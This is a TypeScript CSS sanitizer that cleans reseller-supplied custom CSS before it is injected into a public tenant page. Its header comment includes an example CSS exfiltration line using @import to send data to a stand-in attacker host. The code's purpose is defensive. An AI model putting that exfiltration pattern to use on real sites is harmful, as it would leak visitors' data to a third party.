/**
 * Very conservative CSS sanitizer for reseller-authored custom CSS.
 *
 * We inject this text into a <style> element on the public tenant page.
 * An attacker with reseller-account access could try to:
 *   - exfiltrate via `@import url("http://attacker.com/?leak=...")`
 *   - `@import` third-party stylesheets to steal branding / inject
 *   - embed remote `url(http://...)` backgrounds that phone home
 *   - use `javascript:` or `data:` URIs in `url()` (mostly blocked by
 *     modern browsers but belt-and-suspenders is cheap)
 *
 * Rules:
 *  - Drop any line containing `@import` or `@charset`.
 *  - Inside `url(...)` only allow relative paths, `/`-rooted paths,
 *    and `https:` URLs. Strip anything else.
 *  - Cap total length at 20 KB — a defensive ceiling, not a feature.
 */

const MAX_LEN = 20_000

function sanitizeUrlArg(raw: string): string {
  // Strip matching quotes + whitespace, then decide.
  const trimmed = raw.trim().replace(/^['"]|['"]$/g, '').trim()
  if (trimmed.startsWith('/') || trimmed.startsWith('./') || trimmed.startsWith('../')) {
    return `url("${trimmed}")`
  }
  if (/^https:\/\//i.test(trimmed)) {
    return `url("${trimmed}")`
  }
  // Everything else (data:, http:, javascript:, file:, ftp:, bare domain) → drop.
  return 'url("")'
}

export function sanitizeCustomCss(input: string | null | undefined): string | null {
  if (!input) return null
  let css = input.slice(0, MAX_LEN)

  // Drop dangerous at-rules line-by-line. These are rare enough that
  // killing the whole declaration is acceptable UX; if a legit reseller
  // needs @import they can host the file and @-rule it into their site
  // via a different path.
  css = css
    .split('\n')
    .filter((line) => !/@import\b|@charset\b/i.test(line))
    .join('\n')

  // Rewrite url(...) args through the sanitizer.
  css = css.replace(/url\(\s*([^)]*)\s*\)/gi, (_match, arg: string) => sanitizeUrlArg(arg))

  // Also neutralise `expression(...)` — legacy IE, nothing in modern
  // browsers runs it but static analysers still flag it as risky.
  css = css.replace(/expression\s*\(/gi, 'expression_blocked_(')

  return css
}
